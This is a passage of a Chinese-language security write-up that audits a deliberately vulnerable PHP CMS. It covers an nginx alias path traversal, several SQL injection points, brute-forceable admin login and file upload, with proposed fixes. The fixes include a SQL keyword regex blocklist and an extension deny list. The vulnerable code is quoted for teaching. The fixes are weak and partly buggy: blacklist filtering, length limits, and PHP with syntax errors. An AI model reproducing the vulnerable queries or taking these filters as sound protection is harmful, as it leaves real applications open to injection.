<h2 id="4-目录遍历-1"><a href="#4-目录遍历-1" class="headerlink" title="4.目录遍历"></a>4.目录遍历</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>nginx.conf</code></p>
<pre><code class="hljs awk">location /files &#123;
		  autoindex on;
        alias  <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/public/u</span>ploads/;
&#125;</code></pre>

<p>files后少写一个/</p>
<p>输入url<code>http://192.168.164.147/files../</code>时，相当于访问的是<code>/var/www/public/uploads/../</code>，所以访问的就是<code>/var/www/public/</code>目录。</p>
<h3 id="漏洞防御-3"><a href="#漏洞防御-3" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>该漏洞修复方法很简单</p>
<p>修改<code>nginx.conf</code></p>
<pre><code>location /files/ &#123;
          autoindex on;
        alias  /var/www/public/uploads/;
&#125;</code></pre><h2 id="5-SQL注入"><a href="#5-SQL注入" class="headerlink" title="5.SQL注入"></a>5.SQL注入</h2><h3 id="漏洞点一-5"><a href="#漏洞点一-5" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-3"><a href="#代码分析-3" class="headerlink" title="代码分析"></a>代码分析</h4><p>代码位置<code>application\change\controller\Changepass.php</code></p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
        <span class="hljs-variable">$account</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;account&#x27;</span>];
        <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];
        <span class="hljs-variable">$npassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;npassword&#x27;</span>];
        <span class="hljs-variable">$newpassword</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;newpassword&#x27;</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$account</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$password</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$npassword</span> != <span class="hljs-string">&#x27;&#x27;</span> &amp;&amp; <span class="hljs-variable">$newpassword</span> !=<span class="hljs-string">&#x27;&#x27;</span>)&#123;
            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$npassword</span> === <span class="hljs-variable">$newpassword</span>) &#123;
                <span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `username` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
                <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>)) &#123;
                    <span class="hljs-variable">$sql</span> = Db::query(<span class="hljs-string">&quot;select `password`,`encrypt` from yzn_member where username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
                    <span class="hljs-variable">$encrypt</span> = <span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;encrypt&#x27;</span>];
                    <span class="hljs-variable">$encrypt_password</span> = <span class="hljs-variable">$password</span> . <span class="hljs-variable">$encrypt</span>;
                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$sql</span>[<span class="hljs-number">0</span>][<span class="hljs-string">&#x27;password&#x27;</span>] === md5(<span class="hljs-variable">$encrypt_password</span>)) &#123;
                        <span class="hljs-variable">$pwd</span> = md5(<span class="hljs-variable">$newpassword</span>.<span class="hljs-variable">$encrypt</span>);
                        <span class="hljs-variable">$change</span> = Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `password`=&#x27;<span class="hljs-subst">$pwd</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$account</span>&#x27;&quot;</span>);
                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&quot;successful!&quot;</span>);
                    &#125; <span class="hljs-keyword">else</span> &#123;
                        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;wrong password!&quot;</span>);
                    &#125;
                &#125; <span class="hljs-keyword">else</span> &#123;
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;no user!&quot;</span>);
                &#125;
            &#125;
            <span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;new password are different!&quot;</span>);
            &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;please input content!!!&quot;</span>);
        &#125;
    &#125;</code></pre>

<p>这段代码的意思就是，先检查用户的输入是否为空，不为空则判断两次输入的新密码是否一样，一样先到数据库中查找该用户，如果有该用户，则取出该用户的密码和加密因子，然后判断旧密码是否正确，正确则将新密码和加密因子的md5值写入数据库，密码修改成功。</p>
<p>这里可以看到并没有返回查询的信息，但是也没有对用户输入的数据进行检查和过滤，所以攻击根据错误提示进行盲注攻击。</p>
<h4 id="漏洞防御-4"><a href="#漏洞防御-4" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><ul>
<li><p><strong>方法一</strong></p>
<p>对sql注入使用的关键词进行过滤，写一个waf对输入的数据进行检查</p>
<p>这里的话只需要对用户名进行过滤，因为只有用户名被带入到sql语句中进行查询</p>
<pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">inject_check</span>(<span class="hljs-params"><span class="hljs-variable">$Sql_Str</span></span>) </span>&#123;<span class="hljs-comment">//检测Sql的注入语句。</span>
   <span class="hljs-variable">$check</span>=preg_match(<span class="hljs-string">&#x27;/select|from|where|if|database|order|insert|update|or|group_concat|\&#x27;|\\*|\*|\.\.\/|\.\/|union|and|ascii|substring|sleep/i&#x27;</span>,<span class="hljs-variable">$Sql_Str</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$check</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;hacker!!!&quot;</span>)
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$Sql_Str</span>;
    &#125;
&#125;</code></pre>

<img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210420144316454.png" alt="image-20210420144316454" style="zoom:67%;">

<p>可以看到使用bp进行注入fuzzing，可以发现很多payload都已经被过滤</p>
</li>
<li><p><strong>方法二</strong></p>
<p>第一种方法很简单，就是限制用户名和密码的长度，然后对用户的输入进行长度限制</p>
<p>因为是用户名和密码位置，用户名的长度一般不会超过20个字符，密码也不会超过20个字符，那么这里只需要在用户提交完数据后，在后端检测用户名和密码的长度，这样就可以让sql注入攻击无法发挥威力，因为在20个字符范围之内很难构造出有效的攻击语句。</p>
</li>
</ul>
<h3 id="漏洞点二-5"><a href="#漏洞点二-5" class="headerlink" title="漏洞点二"></a><strong>漏洞点二</strong></h3><h4 id="代码分析-4"><a href="#代码分析-4" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">jifen</span>(<span class="hljs-params"></span>)</span>&#123;
    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&quot;</span>;
    <span class="hljs-variable">$point</span>=<span class="hljs-number">0</span>;
    <span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;userid;
    <span class="hljs-variable">$sql</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];
    <span class="hljs-variable">$point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$sql</span>[<span class="hljs-string">&#x27;point&#x27;</span>];
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;
        <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
        <span class="hljs-variable">$num</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;num&#x27;</span>];
        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> !== <span class="hljs-keyword">$this</span>-&gt;userinfo[<span class="hljs-string">&#x27;username&#x27;</span>] &amp;&amp; <span class="hljs-variable">$num</span> &lt;= <span class="hljs-variable">$point</span>)&#123;
            <span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];
            <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;
                <span class="hljs-variable">$new_point</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;point&#x27;</span>] + <span class="hljs-variable">$num</span>;
                <span class="hljs-variable">$point</span> = <span class="hljs-variable">$point</span> - <span class="hljs-variable">$num</span>;
                Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$point</span>&#x27; WHERE id=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);
                Db::query(<span class="hljs-string">&quot;UPDATE `yzn_member` SET `point`=&#x27;<span class="hljs-subst">$new_point</span>&#x27; WHERE username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>);
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;成功向&quot;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&quot;赠送&quot;</span>.(<span class="hljs-keyword">string</span>)<span class="hljs-variable">$num</span>.<span class="hljs-string">&quot;积分!&quot;</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;不存在该用户！&quot;</span>;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
            &#125;
        &#125;<span class="hljs-keyword">else</span>&#123;
            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;注意用户名不能是自己且积分数点数需要小于自己当前积分!&quot;</span>;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/jifen&#x27;</span>,[<span class="hljs-string">&#x27;point&#x27;</span>=&gt;<span class="hljs-variable">$point</span>,<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
        &#125;
    &#125;</code></pre>

<p>在这段代码中会将用户提交的用户名带到sql语句中查询</p>
<pre><code class="hljs php"><span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `point` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];</code></pre>

<p>虽然此处没有返回值，但是如果查询失败就会提示<code>$msg=&quot;不存在该用户！&quot;</code>，导致攻击者可以使用盲注攻击</p>
<h4 id="漏洞防御-5"><a href="#漏洞防御-5" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>同样可以直接使用上面的过滤函数</p>
<h3 id="漏洞点三-3"><a href="#漏洞点三-3" class="headerlink" title="漏洞点三"></a><strong>漏洞点三</strong></h3><h4 id="代码分析-5"><a href="#代码分析-5" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Index.php</code>中的<code>finduser</code>方法</p>
<pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">finduser</span>(<span class="hljs-params"></span>)</span>&#123;
  	<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
<span class="hljs-variable">$email</span> = <span class="hljs-string">&#x27;&#x27;</span>;	
      <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>]!==<span class="hljs-string">&#x27;&#x27;</span>)&#123;
      	<span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];
      	<span class="hljs-variable">$deny_str</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;from&#x27;</span>,<span class="hljs-string">&#x27;or&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>);
      	<span class="hljs-variable">$username</span> = str_ireplace(<span class="hljs-variable">$deny_str</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$username</span>);
      	<span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `email` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];

      	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;
      		<span class="hljs-variable">$email</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;email&#x27;</span>];
      		<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;查询成功! &#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;的邮箱是:&#x27;</span>;
	<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;email&#x27;</span>=&gt;<span class="hljs-variable">$email</span>]);
      	&#125;<span class="hljs-keyword">else</span>&#123;
      		<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;查询失败，&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;不存在,请检查用户名是否正确!&#x27;</span>;
      		<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
      	&#125;
      &#125;
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>);
  &#125;</code></pre>

<p>可以看到，对用户提交的数据进行了过滤，但是过滤的内容很少，而且很容易就被绕过</p>
<h4 id="漏洞防御-6"><a href="#漏洞防御-6" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>这里的防御就可以直接使用上面过滤函数</p>
<h3 id="漏洞点四-2"><a href="#漏洞点四-2" class="headerlink" title="漏洞点四"></a><strong>漏洞点四</strong></h3><p>代码位置<code>application\member\controller\Content.php</code></p>
<h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-number">0</span>);
            <span class="hljs-variable">$info</span> = Db::query(<span class="hljs-string">&#x27;SELECT * FROM `yzn_member_content` WHERE `uid` = &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;userid.<span class="hljs-string">&#x27; AND `id` = &#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27; LIMIT 1&#x27;</span>)[<span class="hljs-number">0</span>];
            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$info</span>)) &#123;
                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;稿件不存在！&#x27;</span>);
            &#125;</code></pre>

<p>这里直接将用户提交的数据id，带入到sql语句中查询，并且没有进行过滤</p>
<h4 id="漏洞防御-7"><a href="#漏洞防御-7" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
<p>  因为id是一个数字，那么直接对id这个参数进行限制，只允许用户提交数字型数据</p>
<pre><code class="hljs php"><span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$id</span>))&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;id必须是数字！&quot;</span>)
&#125;</code></pre>

<p><strong>方法二</strong></p>
<p>与上面的方法二一样，对id参数进行过滤</p>
<h2 id="6-暴力破解-1"><a href="#6-暴力破解-1" class="headerlink" title="6.暴力破解"></a>6.暴力破解</h2><h3 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h3><p>该漏洞存在于管理员后台登录，造成该漏洞的原因大多是因为管理人员没有修改初始密码，或者心存侥幸改成了比较常见的密码，这样就给了攻击者可乘之机，直接使用暴力破解就可以攻克后台管理页面。</p>
<p>代码位于<code>application\admin\controller\Index.php</code>中的<code>login()</code>方法</p>
<pre><code class="hljs php"> <span class="hljs-comment">//登录判断</span>
 <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function"> </span>&#123;
     <span class="hljs-variable">$url</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;get(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;index/index&#x27;</span>);
     <span class="hljs-keyword">if</span> (User::instance()-&gt;isLogin()) &#123;
         <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);
     &#125;
     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
         <span class="hljs-variable">$data</span>      = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();
         <span class="hljs-variable">$keeplogin</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;keeplogin&#x27;</span>);
<span class="hljs-comment">// 对提交数据进行检查</span>
         <span class="hljs-variable">$rule</span> = [
             <span class="hljs-string">&#x27;username|用户名&#x27;</span> =&gt; <span class="hljs-string">&#x27;require|alphaDash|length:3,20&#x27;</span>,
             <span class="hljs-string">&#x27;password|密码&#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|length:3,20&#x27;</span>,
             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
         ];
         <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$rule</span>);
         <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);
         &#125;
         <span class="hljs-keyword">if</span> (User::instance()-&gt;login(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;
             <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;恭喜您，登陆成功&#x27;</span>, url(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));
         &#125; <span class="hljs-keyword">else</span> &#123;
             <span class="hljs-variable">$msg</span> = User::instance()-&gt;getError();
             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;用户名或者密码错误!&#x27;</span>;
             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);
         &#125;
     &#125; <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-keyword">if</span> (User::instance()-&gt;autologin()) &#123;
             <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);
         &#125;
         <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
     &#125;
 &#125;</code></pre>



<p>虽然每次登录都需要带有token，但是也是不安全的，因为token的值是可以从前端页面获取的</p>
<h3 id="漏洞防御-8"><a href="#漏洞防御-8" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>防御方法就是限制管理员登录时密码输入的错误次数，当错误次数达到一定数量时，就锁定该账号，需要拥有数据库管理权限的真正管理员才能重新登录。</p>
<p>首先在数据库中创建一个表<code>yzn_loginfo</code>，里面只需要一个字段，用来记录admin账号连续输入错误密码的次数。</p>
<p>具体方法为</p>
<p>首先进入mysql容器内部</p>
<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec -it ed<span class="hljs-number">1</span>c<span class="hljs-number">19</span>bb<span class="hljs-number">4</span>a<span class="hljs-number">95</span> bash</code></pre>

<p>之后登录root账号，在数据库中建立一张表</p>
<pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> `yzn_loginfo` (
  `login_fail` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
) ENGINE<span class="hljs-operator">=</span>MyISAM <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8;</code></pre>

<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408102912089.png" alt="image-20210408102912089"></p>
<p>修改代码<code>application\admin\controller\Index.php</code>中的<code>login()</code>方法</p>
<p>其中戴// 是增加的代码</p>
<pre><code class="hljs php"><span class="hljs-comment">// 从yzn_loginfo表中获取到 login_fail的值</span>
<span class="hljs-variable">$login_fail</span> = Db::query(<span class="hljs-string">&#x27;SELECT * FROM `yzn_loginfo`&#x27;</span>)[<span class="hljs-number">0</span>]; <span class="hljs-comment">//</span>
         <span class="hljs-variable">$login_fail_count</span> = <span class="hljs-variable">$login_fail</span>[<span class="hljs-string">&#x27;login_fail&#x27;</span>];     <span class="hljs-comment">// </span>
<span class="hljs-comment">// 如果密码错误超过 5 则锁定账号</span>
         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$login_fail_count</span> &gt;= <span class="hljs-number">5</span>)&#123;                        <span class="hljs-comment">//	</span>
             <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;账号被锁定，请联系网站管理员！&quot;</span>;			 <span class="hljs-comment">//</span>
             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>,<span class="hljs-variable">$url</span>);					   <span class="hljs-comment">//</span>
         &#125;

         <span class="hljs-keyword">if</span> (User::instance()-&gt;login(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;
          <span class="hljs-comment">// 如果输入的密码正确，说明是真正的admin，将login_fail值更新为0</span>
             Db::query(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>); 							<span class="hljs-comment">// </span>
             <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;恭喜您，登陆成功&#x27;</span>, url(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));
         &#125; <span class="hljs-keyword">else</span> &#123;
             <span class="hljs-variable">$msg</span> = User::instance()-&gt;getError();
             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;用户名或者密码错误!&#x27;</span>;
             <span class="hljs-comment">// 如果输入的密码不正确，则将login_fail的值+1后再到数据库中更新</span>
             <span class="hljs-variable">$login_fail_count_new</span> = <span class="hljs-variable">$login_fail_count</span> + <span class="hljs-number">1</span>;  <span class="hljs-comment">//</span>
             Db::query(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`= &#x27;</span>.<span class="hljs-variable">$login_fail_count_new</span>.<span class="hljs-string">&#x27; WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>);							  <span class="hljs-comment">//</span>
             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);
         &#125;</code></pre>



<p>当连续输错五次密码时，账号就被锁定，此时没有任何人能够登录，必须到数据库中需改<code>yzn_loginfo</code>的<code>login_fail</code>的值，这也就达到了防止暴力破解的攻击。</p>
<p>即执行下面这个sql语句</p>
<pre><code class="hljs n1ql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-symbol">`yzn_loginfo`</span> <span class="hljs-keyword">SET</span> <span class="hljs-symbol">`login_fail`</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-symbol">`login_fail`</span>= <span class="hljs-number">5</span>;</code></pre>



<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408104728600.png" alt="image-20210408104728600"></p>
<h2 id="7-文件上传"><a href="#7-文件上传" class="headerlink" title="7.文件上传"></a>7.文件上传</h2><h3 id="漏洞点一-6"><a href="#漏洞点一-6" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Index.php</code> 中的photo方法</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;
    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;
    define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;

     <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);
        
